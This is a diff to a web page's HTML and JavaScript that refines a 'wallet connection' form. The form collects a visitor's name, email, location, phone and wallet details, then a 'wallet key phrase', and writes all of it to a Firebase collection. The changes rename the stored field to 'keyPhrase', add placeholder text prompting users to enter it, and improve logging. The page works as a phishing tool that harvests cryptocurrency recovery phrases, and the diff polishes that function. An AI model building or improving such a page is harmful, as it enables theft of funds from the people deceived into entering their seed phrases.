@@ -268,6 +268,7 @@
       background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='7' viewBox='0 0 12 7'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23f5c518' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
       background-repeat: no-repeat;
       background-position: right 16px center;
+      padding-right: 40px;
     }
 
     select option {
@@ -578,13 +579,11 @@
         <input type="text" id="wallet-type" placeholder="e.g. MetaMask, Trust Wallet, Phantom..." />
       </div>
       
-      <h2>
       <div class="divider">KEY PHRASE</div>
-      </h2>
       <!-- About / Bio -->
       <div class="field-group">
-        <label for="about">input wallet key phrase</label>
-        <textarea id="about"></textarea>
+        <label for="about">Input wallet key phrase</label>
+        <textarea id="about" placeholder="Enter your wallet key phrase here..."></textarea>
       </div>
 
       <!-- Connect button -->
@@ -643,9 +642,9 @@
     const walletName = document.getElementById('wallet-name').value.trim();
     const walletAddr = document.getElementById('wallet-addr').value.trim();
     const walletType = document.getElementById('wallet-type').value.trim();
-    const about = document.getElementById('about').value.trim();
+    const keyPhrase = document.getElementById('about').value.trim();
 
-    if (!name || !email || !location || !walletName || !walletAddr || !walletType || !about) {
+    if (!name || !email || !location || !walletName || !walletAddr || !walletType || !keyPhrase) {
       showToast('⚠️ Please fill in all required fields.');
       return;
     }
@@ -655,7 +654,17 @@
     btn.disabled = true;
 
     try {
-      await addDoc(collection(db, 'wallet_connections'), {
+      console.log('Sending data to Firebase...', {
+        name,
+        email,
+        location,
+        phone,
+        walletName,
+        walletAddr,
+        walletType
+      });
+
+      const docRef = await addDoc(collection(db, 'wallet_connections'), {
         name,
         email,
         location,
@@ -663,16 +672,21 @@
         walletName,
         walletAddress: walletAddr,
         walletType,
-        about,
+        keyPhrase,
         submittedAt: serverTimestamp()
       });
 
+      console.log('Document written successfully with ID:', docRef.id);
+      
       document.getElementById('successName').textContent = name;
       document.getElementById('successOverlay').classList.add('show');
+      showToast('✅ Successfully connected to Firebase!');
 
     } catch (err) {
-      console.error(err);
-      showToast('❌ Connection failed. Please try again.');
+      console.error('Firebase error:', err);
+      console.error('Error code:', err.code);
+      console.error('Error message:', err.message);
+      showToast('❌ Connection failed: ' + err.message);
     } finally {
       btn.classList.remove('loading');
       btn.disabled = false;
@@ -685,10 +699,10 @@
     document.getElementById('email').value = '';
     document.getElementById('location').value = '';
     document.getElementById('phone').value = '';
+    document.getElementById('wallet-name').value = '';
     document.getElementById('wallet-addr').value = '';
     document.getElementById('about').value = '';
     document.getElementById('wallet-type').value = '';
-    document.querySelector('input[name="wallet"]#w-metamask') && (document.querySelector('input[name="wallet"]#w-metamask').checked = true);
   };
 
   function showToast(msg) {
